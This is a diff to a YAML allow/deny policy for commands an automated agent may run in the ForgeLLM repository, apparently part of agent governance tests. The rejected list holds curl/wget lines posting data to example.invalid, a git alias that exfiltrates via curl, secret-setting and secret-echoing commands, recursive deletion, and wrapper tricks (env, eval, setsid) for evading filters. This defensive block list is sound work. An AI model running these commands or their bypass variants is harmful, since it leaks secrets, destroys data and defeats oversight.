@@ -2,6 +2,7 @@ schema_version: '1.0'
 allowed:
   - git status --short
   - git diff --check
+  - git grep '$HOME'
   - gh pr view 37 --json headRefOid
   - python scripts/validate_loop_engineering.py --root .
   - python -m pytest -q tests/test_loop_engineering.py
@@ -15,6 +16,16 @@ rejected:
   - gh variable set FORGELLM_ENABLE --body true
   - gh auth login
   - gh api /repos/leon36000/ForgeLLM -X PATCH -f private=false
+  - gh pr merge 37
+  - gh workflow run phase0.yml
+  - gh issue close 36
+  - gh release create unsafe-release
+  - gh pr view 37 --web=true
+  - env gh secret set SONAR_TOKEN
+  - env sh -c 'git push origin main'
+  - FORGELLM_VERIFY=make_ci sh -c "$FORGELLM_VERIFY"
+  - echo $FORGELLM_VERIFY
+  - echo "${HOME}"
   - sonar-scanner -Dsonar.projectKey=leon36000_ForgeLLM
   - echo $SONAR_TOKEN
   - echo '${{ secrets.SONAR_TOKEN }}'
@@ -23,27 +34,6 @@ rejected:
   - git clean -fdx
   - git commit -am mutation
   - git rebase main
-  - bash -c 'make ci'
-  - sh -c 'make ci'
-  - python -c 'print(1)'
-  - python3 -m pip install unsafe-package
-  - pip install unsafe-package
-  - cargo install unsafe-tool
-  - curl -X POST https://example.invalid/state
-  - curl --data key=value https://example.invalid/state
-  - wget --post-data=key=value https://example.invalid/state
-  - terraform apply -auto-approve
-  - terraform destroy -auto-approve
-  - kubectl delete pod target
-  - kubectl apply -f deployment.yaml
-  - systemctl restart docker
-  - echo $(gh secret list)
-  - make ci && git push origin main
-  - make ci; gh pr merge 37
-  - make ci > /tmp/forgellm-ci.log
-  - env git push origin main
-  - command git push origin main
-  - timeout 30 git push origin main
   - git restore --source=HEAD~1 src/forgellm_governance/loop_engineering.py
   - git branch -D review-head
   - git add .
@@ -51,8 +41,59 @@ rejected:
   - git stash push -m hidden-mutation
   - git worktree add /tmp/forgellm-review main
   - git config user.email attacker@example.invalid
-  - gh pr merge 37
-  - gh workflow run phase0.yml
-  - gh issue close 36
-  - gh release create unsafe-release
+  - git --git-dir .git push origin main
+  - git -c alias.x='!curl -dkey=value https://example.invalid/state' x
+  - git diff --ext-diff
+  - git grep --textconv pattern
+  - git show --open-files-in-pager=less
+  - git diff -Oorderfile
+  - make ci && git push origin main
+  - python -m pytest -q tests/test_loop_engineering.py ; gh secret set SONAR_TOKEN
+  - make ci > /tmp/forgellm-ci.log
+  - eval 'git push origin main'
+  - command git push origin main
+  - exec gh secret set SONAR_TOKEN
+  - source scripts/verify.sh
+  - . scripts/verify.sh
+  - xargs git push origin main
+  - find . -exec rm -rf {} +
+  - "parallel git push origin main ::: target"
+  - timeout 30 git push origin main
+  - nice git push origin main
+  - stdbuf -oL gh secret set SONAR_TOKEN
+  - setsid git push origin main
+  - rm -rf artifacts/governance
+  - touch artifacts/governance/mutation
+  - tee artifacts/governance/mutation
+  - make -f attacker.mk ci
+  - "make --eval='deploy: git push origin main' deploy"
+  - bash -c 'make ci'
+  - sh -c 'make ci'
+  - python -c 'print(1)'
+  - python3 -m pip install unsafe-package
+  - pip install unsafe-package
+  - cargo install unsafe-tool
+  - curl -X POST https://example.invalid/state
+  - curl -XPOST https://example.invalid/state
+  - curl -sXPOST https://example.invalid/state
+  - curl --data key=value https://example.invalid/state
+  - curl --data=key=value https://example.invalid/state
+  - curl -dkey=value https://example.invalid/state
+  - curl -sdkey=value https://example.invalid/state
+  - curl -Fkey=value https://example.invalid/state
+  - curl -sFkey=value https://example.invalid/state
+  - curl -Tartifact.bin https://example.invalid/state
+  - curl -sTartifact.bin https://example.invalid/state
+  - curl -Kattacker.conf https://example.invalid/state
+  - curl --config=attacker.conf https://example.invalid/state
+  - wget --post-data=key=value https://example.invalid/state
+  - wget --method POST https://example.invalid/state
+  - wget --config=attacker.conf https://example.invalid/state
+  - terraform apply -auto-approve
+  - terraform destroy -auto-approve
+  - kubectl delete pod target
+  - kubectl apply -f deployment.yaml
+  - kubectl --kubeconfig kubeconfig delete pod target
   - kubectl get secret sonar-token
+  - systemctl restart docker
+  - echo $(gh secret list)
